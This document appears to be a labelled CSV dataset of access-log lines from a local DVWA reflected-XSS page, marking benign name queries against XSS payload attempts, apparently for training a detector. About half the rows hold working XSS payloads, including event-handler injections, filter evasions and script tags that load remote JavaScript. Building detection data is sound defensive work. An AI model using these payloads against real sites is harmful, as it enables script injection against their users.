,url,malicious
8017,"127.0.0.1 - - [03/May/2021:03:41:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<select onkeyup=\""alert(1)\"""" 400 0 ""-"" ""-""",1
6204,"127.0.0.1 - - [03/May/2021:03:40:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<noframes onkeydown=\""alert(1)\"""" 400 0 ""-"" ""-""",1
8851,"127.0.0.1 - - [03/May/2021:03:13:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Chlo HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
4270,"127.0.0.1 - - [03/May/2021:03:12:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Brandon HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
14378,"127.0.0.1 - - [03/May/2021:02:34:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=\""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode\"">"" 400 0 ""-"" ""-""",1
9632,"127.0.0.1 - - [03/May/2021:03:23:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Papagena HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
13582,"127.0.0.1 - - [03/May/2021:02:34:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a href=\""javas\\x01cript:javascript:alert(1)\"""" 400 0 ""-"" ""-""",1
16321,"127.0.0.1 - - [03/May/2021:03:20:46 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Lonna HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
5339,"127.0.0.1 - - [03/May/2021:03:09:56 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Abby HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
2689,"127.0.0.1 - - [03/May/2021:03:40:47 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<hgroup onmousemove=\""alert(1)\"">test</hgroup>"" 400 0 ""-"" ""-""",1
12576,"127.0.0.1 - - [03/May/2021:03:22:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Maynard HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
5984,"127.0.0.1 - - [03/May/2021:03:10:02 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Adeniyi HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
4483,"127.0.0.1 - - [03/May/2021:03:41:15 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<style>:target {color:red;}</style><ruby"" 400 0 ""-"" ""-""",1
16840,"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<SCRIPT SRC=//ha.ckers.org/.j>"" 400 0 ""-"" ""-""",1
17363,"127.0.0.1 - - [03/May/2021:02:35:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script>+-+-1-+-+alert(1)</script> HTTP/1.1"" 200 1713 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
7082,"127.0.0.1 - - [03/May/2021:02:35:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img src=``&NewLine;"" 400 0 ""-"" ""-""",1
8692,"127.0.0.1 - - [03/May/2021:03:18:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Jeniece HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
18714,"127.0.0.1 - - [03/May/2021:03:17:26 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Henrietta HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
15975,"127.0.0.1 - - [03/May/2021:03:21:37 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Margarita HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
5892,"127.0.0.1 - - [03/May/2021:03:12:02 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Bobette HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
11929,"127.0.0.1 - - [03/May/2021:03:41:21 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<style>@keyframes x{}</style><caption"" 400 0 ""-"" ""-""",1
8257,"127.0.0.1 - - [03/May/2021:03:23:43 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Osama HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
1339,"127.0.0.1 - - [03/May/2021:03:23:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Onge HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
5163,"127.0.0.1 - - [03/May/2021:02:34:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<SCRIPT>document.write(\""<SCRI\"");</SCRIPT>PT SRC=\""http://ha.ckers.org/xss.js\""></SCRIPT>"" 400 0 ""-"" ""-""",1
13651,"127.0.0.1 - - [03/May/2021:03:15:44 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Evans HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
5096,"127.0.0.1 - - [03/May/2021:03:26:15 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Sidney HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
7583,"127.0.0.1 - - [03/May/2021:03:18:22 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Jason HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
11060,"127.0.0.1 - - [03/May/2021:03:12:42 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Caryl HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
6986,"127.0.0.1 - - [03/May/2021:03:41:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<style>@keyframes x{}</style><param"" 400 0 ""-"" ""-""",1
18519,"127.0.0.1 - - [03/May/2021:03:10:10 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ailey HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
9236,"127.0.0.1 - - [03/May/2021:03:07:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=pork HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
711,"127.0.0.1 - - [03/May/2021:03:15:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Enver HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
1242,"127.0.0.1 - - [03/May/2021:03:07:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=prince HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
13247,"127.0.0.1 - - [03/May/2021:03:41:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<param draggable=\""true\"""" 400 0 ""-"" ""-""",1
3824,"127.0.0.1 - - [03/May/2021:03:40:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<bdi draggable=\""true\"""" 400 0 ""-"" ""-""",1
10603,"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=\""`'><script>\\x0Ajavascript:alert(1)</script> HTTP/1.1"" 200 1716 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
8311,"127.0.0.1 - - [03/May/2021:03:12:10 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Breena HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
3655,"127.0.0.1 - - [03/May/2021:03:40:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<keygen onmouseout=\""alert(1)\"">test</keygen>"" 400 0 ""-"" ""-""",1
7808,"127.0.0.1 - - [03/May/2021:03:24:06 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Petter HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
17659,"127.0.0.1 - - [03/May/2021:03:24:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ramesh HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
10140,"127.0.0.1 - - [03/May/2021:03:21:26 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Mansum HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
15809,"127.0.0.1 - - [03/May/2021:03:15:12 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Elle HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
11603,"127.0.0.1 - - [03/May/2021:03:08:26 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=user HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
16757,"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<content onclick=\""alert(1)\"">test</content>"" 400 0 ""-"" ""-""",1
12344,"127.0.0.1 - - [03/May/2021:03:06:55 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=library HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
3029,"127.0.0.1 - - [03/May/2021:03:40:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<listing draggable=\""true\"""" 400 0 ""-"" ""-""",1
754,"127.0.0.1 - - [03/May/2021:03:11:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Bert HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
16588,"127.0.0.1 - - [03/May/2021:03:21:51 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Martha HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
2880,"127.0.0.1 - - [03/May/2021:03:15:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Faiz HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
12726,"127.0.0.1 - - [03/May/2021:02:35:07 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=--><!-- --\\x00>"" 400 0 ""-"" ""-""",1
8580,"127.0.0.1 - - [03/May/2021:03:41:27 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<svg><tbody onload=alert(1)></tbody>"" 400 0 ""-"" ""-""",1
4574,"127.0.0.1 - - [03/May/2021:02:35:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<sCR<script>iPt>alert(1)</SCr</script>IPt> HTTP/1.1"" 200 1717 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
17100,"127.0.0.1 - - [03/May/2021:03:15:20 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Elva HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
4960,"127.0.0.1 - - [03/May/2021:03:40:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<keygen draggable=\""true\"""" 400 0 ""-"" ""-""",1
4765,"127.0.0.1 - - [03/May/2021:03:27:04 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Tawnya HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
12580,"127.0.0.1 - - [03/May/2021:03:06:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=informacion HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
12160,"127.0.0.1 - - [03/May/2021:03:40:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<dd id=x"" 400 0 ""-"" ""-""",1
9076,"127.0.0.1 - - [03/May/2021:03:40:28 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<body onhashchange=\""alert(1)\"">"" 400 0 ""-"" ""-""",1
6829,"127.0.0.1 - - [03/May/2021:03:11:08 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Aris HTTP/1.1"" 200 1695 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
17113,"127.0.0.1 - - [03/May/2021:03:26:04 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Shep HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
136,"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=`\""'><img src=xxx:x"" 400 0 ""-"" ""-""",1
3251,"127.0.0.1 - - [03/May/2021:03:41:40 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script>d.innerHTML+='';</script>//[\""'`-->]]>]</div> HTTP/1.1"" 200 1729 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
1557,"127.0.0.1 - - [03/May/2021:03:41:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<td onbeforecut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
7038,"127.0.0.1 - - [03/May/2021:03:25:16 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Rowe HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
12012,"127.0.0.1 - - [03/May/2021:03:05:20 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=b HTTP/1.1"" 200 1694 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
375,"127.0.0.1 - - [03/May/2021:02:35:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<META onpaonpageonpagonpageonpageshowshoweshowshowgeshow=\""alert(1)\"";"" 400 0 ""-"" ""-""",1
11217,"127.0.0.1 - - [03/May/2021:02:34:57 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<BASE HREF=\""javascript:javascript:alert(1);//\"">"" 400 0 ""-"" ""-""",1
3883,"127.0.0.1 - - [03/May/2021:02:35:18 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<?xml version=\""1.0\"""" 400 0 ""-"" ""-""",1
101,"127.0.0.1 - - [03/May/2021:03:40:21 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<address draggable=\""true\"""" 400 0 ""-"" ""-""",1
7367,"127.0.0.1 - - [03/May/2021:03:41:27 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<svg><caption onload=alert(1)></caption>"" 400 0 ""-"" ""-""",1
11613,"127.0.0.1 - - [03/May/2021:03:21:22 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Maitreya HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
10817,"127.0.0.1 - - [03/May/2021:03:21:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Marco HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
18043,"127.0.0.1 - - [03/May/2021:03:06:19 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=fichero HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
10012,"127.0.0.1 - - [03/May/2021:03:40:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<dfn onkeyup=\""alert(1)\"""" 400 0 ""-"" ""-""",1
5086,"127.0.0.1 - - [03/May/2021:03:06:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=dos HTTP/1.1"" 200 1695 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
4640,"127.0.0.1 - - [03/May/2021:03:17:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Hiroko HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
13871,"127.0.0.1 - - [03/May/2021:03:06:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=entornos HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
9151,"127.0.0.1 - - [03/May/2021:03:10:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ag HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
4370,"127.0.0.1 - - [03/May/2021:03:14:42 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Dorene HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
6592,"127.0.0.1 - - [03/May/2021:03:40:28 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<button autofocus"" 400 0 ""-"" ""-""",1
11643,"127.0.0.1 - - [03/May/2021:03:14:02 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Darrel HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
12895,"127.0.0.1 - - [03/May/2021:03:40:21 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<acronym draggable=\""true\"""" 400 0 ""-"" ""-""",1
1158,"127.0.0.1 - - [03/May/2021:03:41:35 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<ul onmouseup=\""alert(1)\"">test</ul>"" 400 0 ""-"" ""-""",1
10481,"127.0.0.1 - - [03/May/2021:03:11:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Bethina HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
9935,"127.0.0.1 - - [03/May/2021:03:41:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<style onmouseover=\""alert(1)\"">test</style>"" 400 0 ""-"" ""-""",1
17785,"127.0.0.1 - - [03/May/2021:03:18:35 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Jerrilee HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
2894,"127.0.0.1 - - [03/May/2021:02:34:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script ~~~>alert(0%0)</script"" 400 0 ""-"" ""-""",1
17642,"127.0.0.1 - - [03/May/2021:03:27:57 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Viktor HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
10406,"127.0.0.1 - - [03/May/2021:03:41:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<template onmouseout=\""alert(1)\"">test</template>"" 400 0 ""-"" ""-""",1
11843,"127.0.0.1 - - [03/May/2021:02:35:15 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img dynsrc=\""javascript:document.vulnerable=true;\"">"" 400 0 ""-"" ""-""",1
7162,"127.0.0.1 - - [03/May/2021:03:18:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Jenifer HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
15613,"127.0.0.1 - - [03/May/2021:03:08:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=utils HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
1733,"127.0.0.1 - - [03/May/2021:03:41:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<textarea draggable=\""true\"""" 400 0 ""-"" ""-""",1
14035,"127.0.0.1 - - [03/May/2021:03:20:18 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Leland HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
12519,"127.0.0.1 - - [03/May/2021:03:06:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=homework HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
2913,"127.0.0.1 - - [03/May/2021:03:08:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=web HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
5453,"127.0.0.1 - - [03/May/2021:03:26:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Son HTTP/1.1"" 200 1695 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
2434,"127.0.0.1 - - [03/May/2021:03:08:15 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=taylor HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
1877,"127.0.0.1 - - [03/May/2021:03:26:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Sriv HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
5998,"127.0.0.1 - - [03/May/2021:03:19:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Kaz HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
